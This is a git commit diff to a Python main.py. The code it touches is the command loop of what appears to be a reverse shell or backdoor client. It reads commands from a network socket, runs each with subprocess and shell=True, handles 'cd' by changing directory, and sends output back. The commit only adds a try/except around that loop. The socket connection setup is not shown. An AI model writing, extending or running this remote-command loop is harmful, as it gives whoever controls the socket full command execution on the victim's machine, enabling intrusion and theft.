5642468f32b71a34c2dbbc88f65d70148874bc51
faruqer <136151240+faruqer@users.noreply.github.com>
2024-10-07 19:46:37 +0300

    Update main.py

--- main.py
+++ main.py
@@ -11,17 +11,20 @@ def chech_string(recv):
     return "cd" in recv
 
 while True:
-    message = (client_socket.recv(1024).decode("utf-8"))
-    resp = chech_string(message)
-    if not resp:
-        result = subprocess.run(message, shell=True, capture_output=True, text=True)
-        out = result.stdout
-        err = result.stderr
-        if not err:
-            client_socket.sendall(out.encode("utf-8"))
+    try:
+        message = (client_socket.recv(1024).decode("utf-8"))
+        resp = chech_string(message)
+        if not resp:
+            result = subprocess.run(message, shell=True, capture_output=True, text=True)
+            out = result.stdout
+            err = result.stderr
+            if not err:
+                client_socket.sendall(out.encode("utf-8"))
+            else:
+                client_socket.sendall(err.encode("utf-8"))
         else:
-            client_socket.sendall(err.encode("utf-8"))
-    else:
-        command = message.removeprefix("cd").strip()
-        os.chdir(command)
-        client_socket.sendall(os.getcwd().encode("utf-8"))
+            command = message.removeprefix("cd").strip()
+            os.chdir(command)
+            client_socket.sendall(os.getcwd().encode("utf-8"))
+    except:
+        client_socket.sendall("Error occoued. Send the command again".encode("utf-8"))
